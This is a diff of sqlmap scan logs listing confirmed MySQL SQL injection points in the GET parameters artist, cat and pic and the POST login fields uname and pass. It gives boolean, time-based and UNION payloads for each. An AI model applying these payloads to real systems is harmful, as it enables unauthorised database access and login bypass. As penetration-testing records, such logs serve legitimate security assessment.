@@ -1,108 +1,16 @@
-sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
+sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:
 ---
 Parameter: artist (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: artist=1 AND 6831=6831
+    Payload: artist=1 AND 8233=8233
 
     Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
-    Payload: artist=1 AND SLEEP(5)
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 9377 FROM (SELECT(SLEEP(5)))vmSX)
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 3 columns
-    Payload: artist=-5623 UNION ALL SELECT CONCAT(0x7178707171,0x45697a42685450687a694f464f53666c656f445a6e49654358704c6b5346565673575052667a656e,0x716a706271),NULL,NULL-- -
+    Payload: artist=-4852 UNION ALL SELECT NULL,CONCAT(0x71627a6b71,0x6b557a71706b664d6a616778635350434f564372634a594a444a4a42426c6c576b7843417353727a,0x717a766271),NULL-- -
 ---
 back-end DBMS: MySQL >= 5.0.12
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: artist (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: artist=1 AND 6831=6831
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
-    Payload: artist=1 AND SLEEP(5)
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: artist=-5623 UNION ALL SELECT CONCAT(0x7178707171,0x45697a42685450687a694f464f53666c656f445a6e49654358704c6b5346565673575052667a656e,0x716a706271),NULL,NULL-- -
----
-back-end DBMS: MySQL >= 5.0.12
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: artist (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: artist=1 AND 6831=6831
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
-    Payload: artist=1 AND SLEEP(5)
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: artist=-5623 UNION ALL SELECT CONCAT(0x7178707171,0x45697a42685450687a694f464f53666c656f445a6e49654358704c6b5346565673575052667a656e,0x716a706271),NULL,NULL-- -
----
-back-end DBMS: MySQL >= 5.0.12
-sqlmap identified the following injection point(s) with a total of 54 HTTP(s) requests:
----
-Parameter: cat (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: cat=1 AND 6208=6208
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: cat=1 AND (SELECT 1429 FROM (SELECT(SLEEP(5)))VKqt)
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 11 columns
-    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178766b71,0x556b50545544564d4b7347776f487058685066626c4f6c4650734570616f596c425156547444645a,0x717a717a71),NULL,NULL-- -
----
-back-end DBMS: MySQL >= 5.0.12
-sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:
----
-Parameter: pic (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: pic=1 AND 6489=6489
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: pic=1 AND (SELECT 8658 FROM (SELECT(SLEEP(5)))qcPe)
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 11 columns
-    Payload: pic=-1748 UNION ALL SELECT NULL,NULL,CONCAT(0x716a767671,0x53526a62626f5a514b574a5a4c52416776454263466842517056726e6252457a4753656950647578,0x7171626b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
----
-back-end DBMS: MySQL >= 5.0.12
-sqlmap identified the following injection point(s) with a total of 235 HTTP(s) requests:
----
-Parameter: pass (POST)
-    Type: boolean-based blind
-    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
-    Payload: uname=ShEK&pass=-8039' OR 5817=5817#
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: uname=ShEK&pass=' AND (SELECT 3712 FROM (SELECT(SLEEP(5)))mWyh)-- aTmk
-
-    Type: UNION query
-    Title: MySQL UNION query (NULL) - 8 columns
-    Payload: uname=ShEK&pass=' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71716a7671,0x69715968684c7a6c5047714b4a61796b5641566c69424f5643634c4e6c4e4e4d6673437459587661,0x716b766a71),NULL,NULL,NULL,NULL#
-
-Parameter: uname (POST)
-    Type: boolean-based blind
-    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
-    Payload: uname=-5748' OR 5961=5961#&pass=
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: uname=ShEK' AND (SELECT 8004 FROM (SELECT(SLEEP(5)))pPaS)-- ejMY&pass=
-
-    Type: UNION query
-    Title: MySQL UNION query (NULL) - 8 columns
-    Payload: uname=ShEK' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71716a7671,0x41574355467475434d766e43536f765a6c4869755666756b4b77424d59595a57706e4d44554a476e,0x716b766a71),NULL#&pass=
----
